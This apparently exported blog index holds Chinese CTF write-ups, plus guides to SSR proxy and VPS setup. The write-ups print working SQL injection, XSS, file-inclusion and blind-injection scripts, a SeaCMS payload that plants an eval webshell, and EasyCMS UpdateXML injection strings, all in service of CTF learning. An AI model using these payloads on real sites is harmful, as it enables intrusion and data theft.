占用两字节ASCII占用一字节PHP中编码为GBK，函数执行添加的是ASCII编码（添加的符号为“\”），MYSQL默认字符集是GBK等宽字节字符集。大家都知道%df’ 被PHP转义，单引号被加上反斜杠\，变成了 %df\’，其中\的十六进制是 %5C ，那么现在 %df\’ =%df%5c%27，如果程序的默认字符集是GBK等宽字节字符集，则MySQL用GBK的编码时，会认为 %df%5c 是一个宽字符，也就是縗，也就是说：%df\’ = %df%5c%27=縗’，有了单引号就好注入了。 payload:1http://103.238.227.13:10083/?id=%df%27 union select 1,string from sql5.key%23 首先，在url栏输入：1http://103.238.227.13:10083/?id=%df%27 报错了,说明可以注入 继续查看可显字段和库名：1http://103.238.227.13:10083/?id=%df%27 union select 1,database()%23 告诉你查询key表里id=1的字段：1http://103.238.227.13:10083/?id=%df%27 union select 1,string from sql5.key%23 得到flag 域名解析hint：听说把 flag.bugku.com 解析到120.24.86.145 就能拿到flag直接改host就行，这里用火狐一个插件直接改访问的host就行 直接拿到flag SQL注入1过滤代码：1234567891011121314//过滤sql$array = array(&apos;table&apos;,&apos;union&apos;,&apos;and&apos;,&apos;or&apos;,&apos;load_file&apos;,&apos;create&apos;,&apos;delete&apos;,&apos;select&apos;,&apos;update&apos;,&apos;sleep&apos;,&apos;alter&apos;,&apos;drop&apos;,&apos;truncate&apos;,&apos;from&apos;,&apos;max&apos;,&apos;min&apos;,&apos;order&apos;,&apos;limit&apos;);foreach ($array as $value)&#123; if (substr_count($id, $value) &gt; 0) &#123; exit(&apos;包含敏感关键字！&apos;.$value); &#125;&#125;//xss过滤$id = strip_tags($id);$query = &quot;SELECT * FROM temp WHERE id=&#123;$id&#125; LIMIT 1&quot;; 注入的关键词几乎都过滤了，但是看到后面有个xss过滤。查资料发现strip_tags（）函数会去除字符串里的html和php标签，思路是先在payload里插入html标签绕过sql的过滤，然后再用xss的过滤去除html的标签： 想通之后很简单，就是常规的sql注入,得到数据库名：1http://103.238.227.13:10087/?id=-1%20uni%3C%3Eon%20sel%3C%3Eect%201,databa%3C%3Ese()%23 payload:1http://103.238.227.13:10087/?id=-1 uni&lt;&gt;on sel&lt;&gt;ect 1,hash fr&lt;&gt;om sql3.key %23 查找表为key的数据表，id=1值hash字段值，得到flag 你必须让他停下这题是不停的刷新页面，用burpsuite抓包就行：多go几次就能拿到flag： 本地包含括号闭合的思路，payload：1http://120.24.86.145:8003/index.php?hello= 1);print_r(file(&quot;./flag.php&quot;) 在服务器上执行的代码是(var_dump(hello=1);print_r(file(“./flag.php”));//得到flag：flag{bug-ctf-gg-99} 反括号`在linux下起着命令替换的作用。命令替换是指shell能够将一个命令的标准输出插在一个命令行中任何位置。如下：12[root@localhost sh]# echo The date is `date` The date is 2011年 03月 14日 星期一 21:15:43 CST 单引号、双引号用于用户把带有空格的字符串赋值给变量事的分界符。如果没有单引号或双引号，shell会把空格后的字符串解释为命令。单引号和双引号的区别。单引号告诉shell忽略所有特殊字符，而双引号忽略大多数，但不包括$、\、`。例子：1234[root@localhost tmp]# echo ‘the date is `date`’ the date is `date` [root@localhost tmp]# echo “the date is `date`” the date is Fri Oct 9 00:11:56 CST 2015 eval( “var_dump($a);”);正是双引号！！！我们就可以用`了！然后用cat读取输出即可！ 变量1某春秋原题。flag In the variable !payload:1http://120.24.86.145:8004/index1.php?args=GLOBALS 参考资料 web5jsfuck右键查看源代码： 复制下来，F12放到控制台回车，得到flag： 头等舱看这个名字就感觉flag在响应头里：F12查看一下响应头，得到flag web4题目提示查看源代码， 进行了URL编码，p1解码：1function checkSubmit()&#123;var a%3ddocument.getElementById(&quot;password&quot;)%3bif(&quot;undefined&quot;!%3dtypeof a)&#123;if(&quot;67d709b2b p2解码：1aa648cf6e87a7114f1&quot;%3d%3da.value)return!0%3balert(&quot;Error&quot;)%3ba.focus()%3breturn!1&#125;&#125;document.getElementById(&quot;levelQuest&quot;).onsubmit%3dcheckSubmit%3b 大概意思就是提交的值与p1里面那段值加上54aa2再加上p2里的值相同就行拼接起来提交就行： flag在index里点进去，看看URL 一个文件包含的题，直接拿php伪协议试：payload:1http://120.24.86.145:8005/post/index.php?file=php://filter//read=convert.base64-encode/resource=index.php base64解码之后得到flag：flag{edulcni_elif_lacol_si_siht} 输入密码查看flag输入5位数密码，直接爆破 得到flag 点击一百万次查看源代码: 当clicks大于1000000时，能拿到flagF12控制台输入clicks=100000000000回车即可得到flag 备份是个好习惯备份文件获取，将index.php.bak下载下来，查看源码：12345678910111213include_once &quot;flag.php&quot;;ini_set(&quot;display_errors&quot;, 0);$str = strstr($_SERVER[&apos;REQUEST_URI&apos;], &apos;?&apos;);$str = substr($str,1);$str = str_replace(&apos;key&apos;,&apos;&apos;,$str);parse_str($str);echo md5($key1);echo md5($key2);if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123; echo $flag.&quot;取得flag&quot;;&#125;?&gt; php弱类型比较，在url栏输入： URL?key1=QNKCDZO&amp;key2=240610708 发现没啥反应，然后看了看源码，发现过滤了key双写key绕过，提交得到flagpayload:1http://120.24.86.145:8002/web16/index.php?kekeyy1=QNKCDZO&amp;kkeyey2=240610708 秋名山老司机直接访问： 很明显是算不到这么快的。只能写脚本了。附上python脚本：12345678910import requestsimport reurl = &apos;http://120.24.86.145:8002/qiumingshan/&apos;s = requests.Session()source = s.get(url)expression = re.search(r&apos;(\d+[+\-*])+(\d+)&apos;, source.text).group()result = eval(expression)post = &#123;&apos;value&apos;: result&#125;print(s.post(url, data = post).text) 这里有个正则匹配来匹配给出的表达式，然后直接用eval计算。最后将value post即可得到flag，但是计算出的表达式长度不一样，可能会超过php的最大长度所以需要多试几遍。 速度要快打开来什么都没有，就是一个你得快点： 查看源代码：1&lt;!-- OK ,now you have to post the margin what you find --&gt; 有一段提示，post margin变量what i find打开bp抓包： 响应头中有个flag,base64之后：1跑的还不错，给你flag吧: NjM4NzUy 估计是把 NjM4NzUy提交上去就行了,但是后面发现还得把NjM4NzUy解一次base64：638752这个后面再说原因。直接上python脚本：1234567891011import requestsimport base64import reurl=&apos;http://120.24.86.145:8002/web6/&apos;a=requests.session()r=a.get(url)FLAG=r.headers[&apos;flag&apos;]p=re.match(&apos;(.*)(: )(.*)&apos;,base64.b64decode(FLAG))payload=&#123;&apos;margin&apos;:base64.b64decode(p.group(3))&#125;r=a.post(url,data=payload)print(r.text) 得到flag: 这里可以看到我的脚本用了两次base64，如果只用一次的话，题目会提示你需要再快点，具体的这里就不试了同时给出php的脚本:12345678910111213141516171819202122232425262728&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; &lt;?php $url = &quot;http://120.24.86.145:8002/web6/&quot;; $contents = file_get_contents($url); $header_arr = get_headers($url); $cookie = $header_arr[5]; $cookie = explode(&apos;:&apos;,$cookie)[1]; $cookie = explode(&apos;;&apos;,$cookie)[0]; $flag = $header_arr[9]; $flag = explode(&apos;:&apos;,$flag)[1]; $flag = base64_decode($flag); $flag = explode(&apos;: &apos;,$flag)[1]; $flag = base64_decode($flag); $post_data = array(&quot;margin&quot;=&gt;$flag); $ch = curl_init(); curl_setopt($ch,CURLOPT_URL,$url); curl_setopt($ch,CURLOPT_RETURNTRANSFER,1); curl_setopt($ch,CURLOPT_COOKIE,$cookie); curl_setopt($ch,CURLOPT_POSTFIELDS,$post_data); $output = curl_exec($ch); curl_close($ch); print_r($output);?&gt; cookies欺骗打开题目看到一堆乱码，但是URL栏看到那个filename，估计是个base64，解码之后果然： 但是前面还有个参数line，行的意思，一开始不知道这个参数有什么用，多试了几次：1http://120.24.86.145:8002/web11/index.php?line=0&amp;filename=a2V5cy50eHQ= 当line=0，1，2等数的时候，对应着文件的0，1，2行所以这个时候我们要做的是就是把index.php这个文件读到，首先将index.phpbase64转码：aW5kZXgucGhw然后写个脚本将line从0~40遍历一次，附上php脚本：12345678910111213141516&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; &lt;?php $url1 = &quot;http://120.24.86.145:8002/web11/index.php?line=&quot;; $url2 = &quot;&amp;filename=aW5kZXgucGhw&quot;; for ($i=0; $i &lt; 40; $i++) &#123; $url = $url1.$i.$url2; $contents = file_get_contents($url); echo $contents; echo &quot;&lt;br&gt;&quot;; &#125; ?&gt; python脚本：123456789# coding:utf8import requests url1 = &quot;http://120.24.86.145:8002/web11/index.php?line=&quot;url2 = &quot;&amp;filename=aW5kZXgucGhw&quot;;for i in range(40): url=url1+str(i)+url2 ans = requests.get(url) print(ans.text) 脚本运行之后得到的源码:123456789101112131415161718error_reporting(0); $file=base64_decode(isset($_GET[&apos;filename&apos;])?$_GET[&apos;filename&apos;]:&quot;&quot;); $line=isset($_GET[&apos;line&apos;])?intval($_GET[&apos;line&apos;]):0; if($file==&apos;&apos;) header(&quot;location:index.php?line=&amp;filename=a2V5cy50eHQ=&quot;); $file_list = array( &apos;0&apos; =&gt;&apos;keys.txt&apos;, &apos;1&apos; =&gt;&apos;index.php&apos;, ); if(isset($_COOKIE[&apos;margin&apos;]) &amp;&amp; $_COOKIE[&apos;margin&apos;]==&apos;margin&apos;)&#123; $file_list[2]=&apos;keys.php&apos;; &#125; if(in_array($file, $file_list))&#123; $fa = file($file); echo $fa[$line]; &#125; ?&gt; 看到源码之后，当存在cookie:margin且等于margin的时候，才能读keys.php的源码,拿bp改个包，并且将文件名参数发送为keys.php转码后的值发送即可得到flag: XSS注入题目提示必须包含alert(_key_)，所以先提交:1URL?id=&lt;script&gt;alert(_key_)&lt;/script&gt; 但是没有给出flag，查看源代码： 可以看到此时s里的内容&lt; &gt;已经被转义成了&amp;lt &amp;gt,所以如果要得到flag，必须先绕过过滤：Unicode编码绕过,查看原理 用\u003c和\u003e来代替&lt; &gt; 1URL?id=\u003cscript\u003e alert(_key_)\u003c/script\u003e 替换之后没有弹窗，但是在源代码里可以看到flag: 这题做了处理，不能用简单的alert来弹窗，但是也有其他方法，payload:1URL?id=\u003cimg%20src=1%20onerror=alert(_key_)\u003e; 得到flag never give up上来发现没什么提示，看了看源代码，提示了1p.html，访问之后。。。到了bugku的论坛，估计是有个跳转，直接拿bp抓包访问即可： 做到这就有种感觉了，这题纯粹是来坑人的,将中间那段代码先复制到记事本(待会方便改)，对编码熟悉一点的人应该都知道该怎么做了，base64转码:1JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ 为什么是这一段，因为base64里是不会出现百分号的，base64解码：附上链接解码之后：1%22%3Bif%28%21%24_GET%5B%27id%27%5D%29%0A%7B%0A%09header%28%27Location%3A%20hello.php%3Fid%3D1%27%29%3B%0A%09exit%28%29%3B%0A%7D%0A%24id%3D%24_GET%5B%27id%27%5D%3B%0A%24a%3D%24_GET%5B%27a%27%5D%3B%0A%24b%3D%24_GET%5B%27b%27%5D%3B%0Aif%28stripos%28%24a%2C%27.%27%29%29%0A%7B%0A%09echo%20%27no%20no%20no%20no%20no%20no%20no%27%3B%0A%09return%20%3B%0A%7D%0A%24data%20%3D%20@file_get_contents%28%24a%2C%27r%27%29%3B%0Aif%28%24data%3D%3D%22bugku%20is%20a%20nice%20plateform%21%22%20and%20%24id%3D%3D0%20and%20strlen%28%24b%29%3E5%20and%20eregi%28%22111%22.substr%28%24b%2C0%2C1%29%2C%221114%22%29%20and%20substr%28%24b%2C0%2C1%29%21%3D4%29%0A%7B%0A%09require%28%22f4l2a3g.txt%22%29%3B%0A%7D%0Aelse%0A%7B%0A%09print%20%22never%20never%20never%20give%20up%20%21%21%21%22%3B%0A%7D%0A%0A%0A%3F%3E ctf做多了就知道，这又是一段URL编码，这个时候比较坑的一点是，你得把这段url编码放到之前的编码里再URL解码URL编码：附上链接解码之后：1234567891011121314151617181920212223242526var Words = &quot;&lt;script&gt;window.location.href=&apos;http://www.bugku.com&apos;;&lt;/script&gt; &lt;!--&quot;;if(!$_GET[&apos;id&apos;])&#123; header(&apos;Location: hello.php?id=1&apos;); exit();&#125;$id=$_GET[&apos;id&apos;];$a=$_GET[&apos;a&apos;];$b=$_GET[&apos;b&apos;];if(stripos($a,&apos;.&apos;))&#123; echo &apos;no no no no no no no&apos;; return ;&#125;$data = @file_get_contents($a,&apos;r&apos;);if($data==&quot;bugku is a nice plateform!&quot; and $id==0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4)&#123; require(&quot;f4l2a3g.txt&quot;);&#125;else&#123; print &quot;never never never give up !!!&quot;;&#125;?&gt;==--&gt;&quot; 直接看代码，访问f4l2a3g.txt得到flag: Misc签到题扫二维码关注bugku然后发送flag就行]]></content>
      <categories>
        <category>writeup</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[“百度杯”CTF比赛 登陆 writeup]]></title>
    <url>%2F2018%2F05%2F31%2Flogindft%2F</url>
    <content type="text"><![CDATA[打开页面是一个登陆框: 查看源代码： 什么都发现不了，但是这个表单中用户名密码的class有点奇怪，先记着 随便输入用户名和密码同时打开burpsuite抓包： 用万能密码试试： 提示密码错误，但是当提交or &#39;1&#39; = &#39;2时，显示的是： 猜测是个布尔型的盲注 试了很多函数不行，最后看的wp，用的是正则表达式：username=or user() regexp '^a' %23```1234567891011121314151617181920212223我们用burpsuite进行盲注：![](http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/59736271.jpg)然后字典选择`a~z,0~9,(),_`用的都是表的常用字符,然后开始爆破：![](http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/66273786.jpg)可以知道第一位是`u`，一直持续下去可以发现这个列的名字就是前面表单用户名的`class`然后密码也是，就不仔细说了，接下来爆列:将`user()`替换成`user_n3me`：![](http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/46135022.jpg)继续爆破：![](http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-5-31/42315072.jpg)可以知道第一位是b，重复这个过程就行了最终得到用户名：`bctf3dm1n`密码：`2bfb1532857ddc0033fdae5bde3facdf`md5解密之后是:`adminqwe123666`一个个爆破可以比较麻烦，这里给出c26大佬的py脚本： import stringimport requests url = ‘http://6990a7a5194048468ddd58ba76d76945610fd134a3ad4269.game.ichunqiu.com/Challenges/login.php&#39;headers = {‘User-Agent’: “Mozilla/5.0 (X11; Linux x86_64; rv:18.0) Gecko/20100101 Firefox/18.0”}payloads = string.ascii_letters + string.digitstemp = ‘’for i in range(40): print(“the”+str(i)+”one”) for p in payloads: payload = temp + p name = “admin’ or user_n3me like ‘{}%’ ;#”.format(payload) data = dict(username=name, passwrod=’test’) res = requests.post(url, headers=headers, data=data) if (len(res.content) == 12): temp = temp + p print(temp.ljust(32, ‘.’)) break`换url和列名就行。 登陆进去之后是这个页面： 那个.bctfg1t看起来像个.git文件，试了一下： 果然是个.git文件，githack跑完之后： 接下来很明显就是还原版本了，git cat-file -p 哈希一直到a1开头的哈希： 出来一个文件名,我们访问他：得到flag：]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>.git泄露</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[解决burpsuite里中文不显示的方法]]></title>
    <url>%2F2018%2F05%2F31%2Fbp%2F</url>
    <content type="text"><![CDATA[burpsuite中文显示不出，某些时候非常不好用 这里用的版本是1.7.26，其他的版本修改方式没有大的区别 打开burpsuite，找到user options: 然后在display中的http message display选择成中文字体，这里选择微软雅黑： 然后就成功了]]></content>
      <categories>
        <category>技术分享</category>
      </categories>
      <tags>
        <tag>burpsuite</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[i春秋 "百度杯" 九月场 123 writeup]]></title>
    <url>%2F2018%2F05%2F28%2F123%2F</url>
    <content type="text"><![CDATA[打开是个登陆界面： 查看一下源代码： 用户信息都在user.php里，密码的结构也告诉你了，猜想是爆破但是现在没有字典，我们先访问一下user.php，发现啥都没有，一开始以为是文件包含，但是没有变量可以用可能是备份文件获取，试试user.php.bak果然： 将文件下载下来之后发现是用户名的信息，打开burpsuite开始爆破：从1990年开始（大佬们wp写的，我也不知道为什么） 字典直接用刚刚的user.php 开始爆破： 得到了一个用户lixiuyun 密码 lixiuyun1990 登陆进去之后也是什么都没有，查看源代码： 本地构建html： php别名：php2, php3, php4, php5, phps, pht, phtm, phtml …都可以试试: 可以看到有个view.php了，打开看看这次估计真是文件包含了： 这里还有个过滤，将flag过滤了双写flag即可拿到flag：]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>爆破</tag>
        <tag>备份文件获取</tag>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[i春秋 "百度杯" 九月场 Yeser writeup]]></title>
    <url>%2F2018%2F05%2F28%2FYeserCMS%2F</url>
    <content type="text"><![CDATA[打开来是一个不知道什么cms的页面： 上cms指纹识别： 但是貌似识别不出来，想想其他方法比如搜一搜传递的变量名，也就是URL后面跟着的一大堆东西 点进去看了看，跟题目的cms差不多差不多确定是easycms了，搜一搜easycms漏洞但是找到的大多数不能用，最终还是看了大佬们写的writeup在URL/celive/live/header.php处有一个xpath注入漏洞xpath注入科普payload：第一段： xajax=Postdata&amp;xajaxargs[0]=detail=xxxxxx%2527%252C%2528UpdateXML%25281%252CCONCAT%25280x5b%252Cmid%2528%2528SELECT%252f%252a%252a%252fGROUP_CONCAT%2528concat %2528username%252C%2527%257C%2527%252Cpassword %2529%2529%2520from%2520yesercms_user %2529%252C1%252C32%2529%252C0x5d %2529%252C1%2529%2529%252CNULL%252CNULL%252CNULL%252CNULL%252CNULL%252CNULL%2529–%2520 第二段： xajax=Postdata&amp;xajaxargs[0]=detail=xxxxxx%2527%252C%2528UpdateXML%25281%252CCONCAT%25280x5b%252Cmid%2528%2528SELECT%252f%252a%252a%252fGROUP_CONCAT%2528concat %2528username%252C%2527%257C%2527%252Cpassword %2529%2529%2520from%2520yesercms_user %2529%252C10%252C32%2529%252C0x5d %2529%252C1%2529%2529%252CNULL%252CNULL%252CNULL%252CNULL%252CNULL%252CNULL%2529–%2520这里得分成两段显示： 得到管理员的账户是admin密码是md5加密的Yeser231 登陆后台： 找地方上传shell，自己找了很久没有找到地方，最后还是看的大佬的wp在模版-&gt;当前模版编辑处 点击编辑，这个时候会把这个文件名传进去，然后再显示出来这个文件的内容： 这个时候直接看到提示：flag在网站根目录下的flag.php中把id换成../../flag.php即可得到flag:]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>xpath注入</tag>
        <tag>命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[i春秋 "百度杯" 九月场 Test writeup]]></title>
    <url>%2F2018%2F05%2F28%2Ftest%2F</url>
    <content type="text"><![CDATA[首先打开题目： 发现是一个海洋CMS，但是不太清楚版本往下翻一翻，发现有个年份 看得出是一个很老的版本了，题目的提示是：善于查资料，你就可以拿一血了好吧直接查资料：海洋cms漏洞利用 直接一大块的漏洞出来了。这里直接找到payload了：/search.php?searchtype=5&amp;tid=&amp;area=eval($_POST[cmd]) 然后打开菜刀：密码cmd连接即可： 连接成功： 可以发现在html/data下有个common.inc.php 这个是数据库的配置文件 菜刀连接数据库拿到flag:]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>命令执行</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Centos6&7 搭建ssr科学上网及IPv6免流]]></title>
    <url>%2F2018%2F05%2F27%2Fssr%2F</url>
    <content type="text"><![CDATA[1.购买vps这里给出链接，就不仔细介绍了 2.搭建ssr连接上xshell或者其他shell软件之后，复制以下命令：wget -N https://raw.githubusercontent.com/ToyoDAdoubi/doubi/master/ssr.shchmod +x ssr.shbash ssr.sh一条一条命令执行即可，执行完之后看到的是这个页面： 选择1安装ssr，将端口号设置成443，密码写个自己能记住的密码： 加密方式选择10. aes-256-cfb 协议插件和混淆插件分别选择：2.auth_sha1_v4和tls1.2_ticket_auth 询问是否兼容原版，原版就是ss，这里选择no，选择yes的话就能支持ss客户端了： 限制的设备数、单线程限速上限、每个端口的总速度，这里都直接回车，选择默认（不限速）：(这里自用，所以没有限速和限流) 回车之后就可以开始安装了： 出来这个页面的话，证明已经安装完成了，如果嫌麻烦的话，这样已经可以直接用了，但是如果你想多端口配置也是可以的,输入:bash ssr.sh进入ssr的管理页面, 如果之前的步骤有些小问题的话这里也是可以修改的，现在我们需要切换成多端口模式： 配置跟之前的单端口一样就行，设置成功后： 直接就有一个端口，这个端口是之前单端口设置的，进入管理页面： 多端口模式下7.用户配置可以添加新的端口： 操作跟之前一样，配置成功后： 3.客户端的安装SSR:Windows：https://nofile.io/f/6Jm7WJCyOVv/ShadowsocksR-4.7.0-win.7z安卓：https://nofile.io/f/rvTJoj0h5GC/shadowsocksr-release.apk windows版解压完之后直接运行： 任务栏会出现一个小飞机：首先我们把前面ssr的链接复制下来，然后右键小飞机，选择剪贴板导入即可。 安卓的比较简单，就不仔细截图了。首先将APK安装-&gt;然后点击顶上方的“▼”-&gt;选择右下方的“+”-&gt;从剪切板导入即可(同样得复制之前的ssr链接) SSWindows：https://github.com/shadowsocks/shadowsocks-windows/releases安卓：https://github.com/shadowsocks/shadowsocks-android/releases 使用方法跟ssr差不多，对照着就行。 4.bbr加速这一步主要是给自己的ssr提速复制以下命令到shell里: yum -y install wget wget --no-check-certificate https://github.com/teddysun/across/raw/master/bbr.sh chmod +x bbr.sh ./bbr.sh 安装完之后会提示你是否重启，选择y然后就能正常使用了。]]></content>
      <categories>
        <category>技术分享</category>
      </categories>
      <tags>
        <tag>免流</tag>
        <tag>科学上网</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[VPS的选择及购买]]></title>
    <url>%2F2018%2F05%2F27%2Fvps%2F</url>
    <content type="text"><![CDATA[这里主要讲述Vutrl的使用，搬瓦工也是可以的（因为都支持支付宝，简单快捷） 注册Vultr打开注册链接点击右上方的Create Account注册比较简单，输入邮箱密码创建就行进入邮箱确认，登陆后： 充值点击Billing,然后点击Make Payment下的Alipay 选择价格然后充值，第一次使用少充点，10美元就行觉得好用再继续充值就行，然后会跳转到支付宝的支付页面，用支付宝付款即可 添加服务器点击左侧的Servers可以看到右边有个“+”号：点击之后，这个页面是选择地区 在国内的话最好选择日本的服务器速度最快可以选择其他地区的比如纽约，洛杉矶，速度也不慢 选择系统类型，这里选择centos6，因为centos7的防火墙可能会导致ssr的一些服务不能用价格选择，当然是越贵越好了，但是这个好只是体现在连接的人数个人用的话选择最便宜的就行了。下方勾选Enable IPv6，需要IPv6免流的可以勾上 然后直接Deploy Now即可 这里附上一种测速方法： 使用ping命令： vutrl一开始最多可以创建5个VPS 创建完之后拿ping命令去试试速度 win+r 输入cmd 在控制台输入：ping 你的服务器IP 看看延迟就行，延迟越低速度越快 如果速度很慢的话把这个服务器删掉就行（创建5分钟之内不能消除） 连接服务器回到Servers页面点击刚刚创建的服务器这里的IP和密码待会得用到 这里有服务器的ssh我们需要使用shell软件来连接他这里演示的是xshell：从网上直接下载xshell就可以使用： 点击文件，新建 名称随便写个就行，主机处填写你服务器的IP然后点击左边的用户身份验证 用户名写root，密码从刚刚那个页面复制下来，然后点击连接就行出现这个页面就代表连接成功了:]]></content>
      <categories>
        <category>技术分享</category>
      </categories>
      <tags>
        <tag>vps购买</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[i春秋 “百度杯”login Writeup]]></title>
    <url>%2F2018%2F05%2F26%2Flogin%2F</url>
    <content type="text"><![CDATA[首先打开来是一个登陆的页面： 看看源码有没有什么提示： 可以看到最后面注释了两个test1 我们拿test1登陆进去试试： 登陆成功。左右看看没有什么发现。打开burpsuite抓包试试: 可以看到响应包有show这个参数，并且等于0我们将show这个参数等于1发送试试: 发送之后果然出现了一段代码： 这段代码的大概意思是： 当$login['user']='ichunqiu'的时候，echo flag 但是login只能从token中获得，并且被几个函数加密了， 我们只需要照着过程逆回去即可 payload： $arr = array('user'=>'ichunqiu'); $hello = base64_encode(gzcompress(serialize('$arr'))); echo $hello; 直接解析之后echo的值就是我们需要的token值,这里解密之后是这个： eJxLtDK0qi62MrFSKi1OLVKyLraysFLKTM4ozSvMLFWyrgUAo4oKXA== 将token放到cookie里发送即可得到flag:]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[i春秋"百度杯" 十月份Backdoor Write up]]></title>
    <url>%2F2018%2F05%2F26%2FBackdoor%2F</url>
    <content type="text"><![CDATA[春秋”百度杯” 十月份Backdoor Write up 首先题目提示: 敏感文件泄露 .git泄露： 使用githack将网站源码下载下来： 目录下有： 但是都是没有用的信息： 访问： .git/logs/refs/heads/master 猜想是还原版本： git checkout 734d08 然后再看看： 果然是，多试几个之后就出来一个不一样的flag文件： 访问b4ckdo0r.php： 其他地方没给什么提示，就试试有没有swp/swo文件：swp文件是vim编辑器不正常退出时产生的文件 URL/.b4ckdo0r.php.swp 或者 URL/.b4ckdo0r.php.swo 然后可以知道swp文件没有，但是`swo`文件存在 下载下来之后将后缀名`swo更改为swp` 在`linux`下进行还原 这里附上还原方法： 在linux下 假设你的swp文件叫'.index.php.swp' 可用带-r参数编辑 #vi -r index.php 然后wq保存即可 或者使用: #vi .index.php.swp 然后:recover 最后wq保存 还原出来之后是: php混淆加密，给出python脚本，参考链接将其中的URL换成题目的URL就行： 执行： python 保存的脚本名字.py b4ckdo0r.php 可以看到phpshell 执行 system('ls'); 查看即可得到flag: system('cat this_i5_flag.php');]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>.git泄露</tag>
        <tag>vim文件备份</tag>
      </tags>
  </entry>
</search>
